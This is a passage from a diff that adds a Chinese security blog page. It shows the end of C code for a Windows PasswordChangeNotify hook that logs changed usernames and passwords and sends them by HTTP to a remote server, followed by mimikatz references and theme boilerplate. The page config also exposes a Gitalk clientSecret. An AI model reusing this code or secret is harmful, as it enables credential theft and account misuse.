class="hljs-string">&quot;SomeData&quot;</span>;<br><br><br><br>	<span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-string">L&quot;PasswordChangeNotify&quot;</span>);<br>	<span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == pFile)<br>    &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>	<span class="hljs-built_in">fprintf</span>(pFile, <span class="hljs-string">&quot;%ws:%ws\r\n&quot;</span>, UserName-&gt;Buffer,NewPassword-&gt;Buffer);<br>  <span class="hljs-built_in">fclose</span>(pFile);<br>	<span class="hljs-built_in">InternetSetOption</span>(hSession,INTERNET_OPTION_USERNAME,UserName-&gt;Buffer,UserName-&gt;Length/<span class="hljs-number">2</span>);<br>	<span class="hljs-built_in">InternetSetOption</span>(hSession,INTERNET_OPTION_PASSWORD,NewPassword-&gt;Buffer,NewPassword-&gt;Length/<span class="hljs-number">2</span>);<br>	<span class="hljs-built_in">HttpSendRequest</span>(hReq,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>,pBuf,<span class="hljs-built_in">strlen</span>(pBuf));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.carnal0wnage.com/2013/09/stealing-passwords-every-time-they.html">https://blog.carnal0wnage.com/2013/09/stealing-passwords-every-time-they.html</a><br><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/blob/bb371c2acba397b4006a6cddc0f9ce2b5958017b/mimilib/kssp.c#L21">https://github.com/gentilkiwi/mimikatz/blob/bb371c2acba397b4006a6cddc0f9ce2b5958017b/mimilib/kssp.c#L21</a><br><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Security%20Support%20Provider.html">https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Security%20Support%20Provider.html</a><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/papers/Archive/drops2/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Hook%20PasswordChangeNotify.html">https://paper.seebug.org/papers/Archive/drops2/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Hook%20PasswordChangeNotify.html</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处，表明作者SD！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/08/31/windows%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90%E6%80%BB%E7%BB%93/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/23/ThinkPHP3.2.x%20RCE%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/">
+                        <span class="hidden-mobile">ThinkPHP3.2.x RCE分析复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"d3fed93d8ca9dd026b6a","clientSecret":"b3ebb466a8206df623c10df13110073b40137bdb","repo":"SD-XD.github.io","owner":"SD-XD","admin":["SD-XD"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":true,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '58a2c92b81a03100465e435fa2b580c7'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
